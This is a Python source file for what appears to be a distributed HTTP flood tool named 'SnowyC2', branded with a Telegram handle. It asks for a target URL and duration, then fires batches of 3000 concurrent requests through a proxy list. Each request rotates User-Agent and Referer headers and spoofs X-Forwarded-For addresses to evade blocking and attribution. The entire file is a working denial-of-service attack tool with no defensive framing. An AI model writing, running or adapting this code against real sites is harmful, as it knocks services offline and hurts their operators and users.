import asyncio
import aiohttp
import random
import time
import sys
import os
import psutil

# Config
MAX_CONCURRENT = 3000
REQUEST_TIMEOUT = 10

def load_list(path, fallback=[]):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return fallback

USER_AGENTS = load_list("uas.txt", ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"])
REFERERS = load_list("refs.txt", ["https://www.google.com/"])
PROXIES = load_list("incognito.txt", [])

class SnowyC2:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target
        self.duration = duration
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.lock = asyncio.Lock()
        self.process = psutil.Process(os.getpid())
        self.start_time = 0

    def get_proxy(self):
        if PROXIES:
            return f"http://{random.choice(PROXIES)}"
        return None

    async def make_request(self, session, proxy):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        try:
            async with session.get(self.target, headers=headers, proxy=proxy, timeout=REQUEST_TIMEOUT) as response:
                async with self.lock:
                    self.stats['total'] += 1
                    if response.status == 200:
                        self.stats['success'] += 1
                    else:
                        self.stats['errors'] += 1
        except:
            async with self.lock:
                self.stats['total'] += 1
                self.stats['errors'] += 1

    async def run_batch(self):
        connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while time.time() < self.start_time + self.duration:
                tasks = [self.make_request(session, self.get_proxy()) for _ in range(MAX_CONCURRENT)]
                await asyncio.gather(*tasks, return_exceptions=True)

    async def display_stats(self):
        while time.time() < self.start_time + self.duration:
            await asyncio.sleep(0.5)
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            rps = self.stats['total'] / elapsed if elapsed > 0 else 0
            self.stats['rps'] = rps
            self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
            ram = self.process.memory_info().rss / 1024 / 1024

            sys.stdout.write("\033[H\033[J")
            print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
            print("=" * 60)
            print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
            print("=" * 60)
            print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
            print(f"RPS: {rps:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
            print(f"REMAINING: {remaining:.1f}s | RAM USED: {ram:.2f} MB")
            print("=" * 60)

    def start(self):
        self.start_time = time.time()
        try:
            asyncio.run(self.main())
        except KeyboardInterrupt:
            print("\nStopped by user.")
        except Exception as e:
            print(f"Error: {str(e)}")

    async def main(self):
        await asyncio.gather(self.run_batch(), self.display_stats())

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)
    method = input("METHOD: ").strip()
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid TIME")
        return

    bot = SnowyC2(method, target, duration)
    bot.start()

if __name__ == "__main__":
    main()
